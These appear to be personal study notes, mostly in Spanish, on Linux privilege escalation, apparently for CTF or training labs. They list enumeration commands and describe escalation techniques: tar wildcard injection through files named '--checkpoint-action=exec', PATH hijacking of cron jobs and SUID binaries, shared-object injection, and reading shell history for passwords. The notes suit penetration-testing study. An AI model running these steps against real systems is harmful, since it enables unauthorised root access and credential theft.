Enumeration:

hostname: nos da el nombre del target (en algunas ocaciones nos da información del rol que tiene el target en la red corporativa)

uname -a : nos brinda información extra sobre el kernel usado por el sistema

cat /proc/version : imprime el archivo proc que nos da info sobre los procesos del target, el kernel y, algunas veces, el compilador que tiene
                    instalado

cat /etc/issue: el archivo issue nos brinda info del sistema operativo, puede ser modificado muy facilmente.

ps : muestra los procesos que están corriendo en el sistema
ps -A : muestra todos los procesos corriendo en el sistema
ps axjf : muestra los árboles de procesos.
ps aux: muestra todos los procesos agregando el user que los llama

env: muestra las variables de entorno del sistema

sudo -l : muestra los comandos que podemos correr como root sin password desde un usuario inferior

ls -la: lista los archivos de un directorio haciendo un display de los permisos que tienen y los usuarios a los que pertenecen

id: muestra los privilegios del ususario y los grupos a los que pertenece.

Enumeración de usuarios:
desde el passwd (recordar que muchos no son ususarios reales, si no usuarios de procesos)
cat /etc/passwd 
para ver solo los usuarios y no su composición:
cat /etc/passwd | cut -d ":" -f 1
para listar usuarios que tengan una carpeta en el home: 
cat /etc/passwd | grep home

netstat: nos muestra las conexiones existentes.
netstat -a : muestra los puertos escuchando y las conexiones establecidas
netstat -at o -au: listan los protocolos tcp o udp
netstat -l : muestra los puertos escuchando
netstat -s: lista el uso de las estadisticas de red despues del protocolo
netstat -i: muestra las interfaces

find:
find . -name flag1.txt: find the file named “flag1.txt” in the current directory
find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
find / -type d -name config: find the directory named config under “/”
find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
find / -perm a=x: find executable files
find /home -user frank: find all files for user “frank” under “/home”
find / -mtime 10: find files that were modified in the last 10 days
find / -atime 10: find files that were accessed in the last 10 day
find / -cmin -60: find files changed within the last hour (60 minutes)
find / -amin -60: find files accesses within the last hour (60 minutes)
find / -size 50M: find files with a 50 MB size
Folders and files that can be written to or executed from:
find / -writable -type d 2>/dev/null : Find world-writeable folders
find / -perm -222 -type d 2>/dev/null: Find world-writeable folders
find / -perm -o w -type d 2>/dev/null: Find world-writeable folders
find / -perm -o x -type d 2>/dev/null : Find world-executable folders
Find development tools and supported languages:

find / -name perl*
find / -name python*
find / -name gcc*

SUID enumeration
find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.
enumerar los SUID y buscar la forma de explotarlos en gtfbins
https://gtfobins.github.io/#+suid


Explotar LD_PRELOAD y LD_LIBRARY_PATH


Explotar cronjobs por medio de la variable de entorno:
Dependiendo del orden de los paths dentro de la variable de entorno PATH del cronlab, podemos suplantar un archivo
en tanto tengamos privilegios sobre una carpeta que, dentro del path, sea anterior a la carpeta donde reside el archivo.

Explotación de wildcard

Si el proceso que tiene un wildcard posee una command line, podemos usar un checkpoint para correr un código malicioso. Ej:

script:
tar czf /tmp/backup.tar.gz *

en la carpeta:
"carpeta a ser compresa"/shell.sh
chmod +x "carpeta"/shell.sh
touch "carpeta"/--checkpoint=1
touch "carpeta"/--checkpoint-action=exec=shell.elf



SUID:


Shared Object Injection:

Podemos inyectar objetos cuando un archivo se sirve de otro no encontrado si es que este(el no encontrado) se encuentra en
un directorio sobre el que tenemos algún poder.
Para saber esto utilizamos el siguiente comando:
strace PATH+ARCHIVO 2>&1 | grep -iE "open|access|no such file"

al divisar el archivo faltante creamos uno con el código malicioso. Al correr nuevamente el fichero, ejecutará nuestro código.

Explotar variables de entorno de un SUID:

al correr un ejecutable podemos ver la acción que realiza.
Si a su vez lo corremos con el comando "strings" podemos ver caracteres imprimibles del mismo.
strings "path/ejecutable"
si vemos que corre comandos que no tienen un path absoluto, sino que son llamados y buscados en la variable PATH, podemos
crear un código malicioso y modificar la variable path preponiendo la carpeta donde se encuentra el file malicioso.
vamos a la carpeta donde está el archivo malicioso y agregamos la orden y agregamos la orden "PATH=.$PATH", con
esto indicamos que la carpeta en la que nos encontramos va a ser el path, y luego el file que vamos a correr
PATH=.:$PATH "path-to-file/file"


Passwords y keys en los arhivos historicos:

cat ~/.*history | less

